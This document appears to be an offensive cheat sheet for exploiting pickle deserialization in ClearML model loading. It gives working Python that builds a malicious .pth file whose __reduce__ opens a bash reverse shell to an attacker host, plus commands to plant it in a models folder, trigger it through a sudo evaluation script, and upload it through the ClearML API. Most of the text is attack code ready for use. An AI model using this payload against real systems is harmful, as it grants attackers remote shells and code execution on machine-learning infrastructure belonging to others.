# ClearML Pickle Deserialization RCE

ClearML loads model artifacts via pickle. If a `.pth` (PyTorch) file is uploaded as a task artifact, loading it executes `__reduce__` — exploitable when a privileged process evaluates uploaded models.

## Create Malicious .pth File

```python
import torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1",))

torch.save(Payload(), 'sploit.pth')
```

## Upload and Trigger

```bash
# If writable path accessible (e.g. /models/):
cp sploit.pth /models/sploit.pth

# If triggered by a sudo-able evaluation script:
sudo /usr/bin/evaluate_model /models/sploit.pth
```

## Via ClearML API

```python
from clearml import Task
task = Task.init(project_name='exploit', task_name='test')
task.upload_artifact('model', artifact_object='sploit.pth')
```

When the ClearML server or a connected agent loads the artifact, the pickle fires.

## Notes

- Also works with plain `.pkl` files: `pickle.dump(Payload(), open('sploit.pkl','wb'))`
- The injected `os.system` call runs as the process loading the model
- Common pattern: web service takes user-uploaded model path, loads with `torch.load()` or `pickle.load()`
